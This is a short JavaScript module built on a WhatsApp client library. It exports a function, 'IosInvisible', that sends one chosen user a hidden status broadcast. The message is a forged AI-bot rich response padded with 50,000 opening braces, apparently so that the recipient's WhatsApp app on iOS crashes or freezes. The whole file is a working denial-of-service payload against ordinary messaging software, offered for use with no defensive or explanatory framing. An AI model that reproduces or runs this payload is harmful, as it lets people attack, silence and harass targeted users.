const { default: makeWASocket, proto, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

// Declaração da função sleep
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function IosInvisible(sock, target) {
    await sock.relayMessage('status@broadcast', {    
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [
                  {
                    view_model: {
                      primitive: {
                        text: "lixo",
                        inline_entities: ["{".repeat(50000)],
                        __typename: "GenAIMarkdownTextUXPrimitive"
                      },
                      __typename: "GenAISingleLayoutViewModel"
                    }
                  }
                ]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: {
                botJid: "0@bot"
              }
            }
          }
        }
      }
    }, {
      statusJidList: [target],      
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
        }]
      }]
    });
    
    await sleep(1000);
}

module.exports = { IosInvisible };
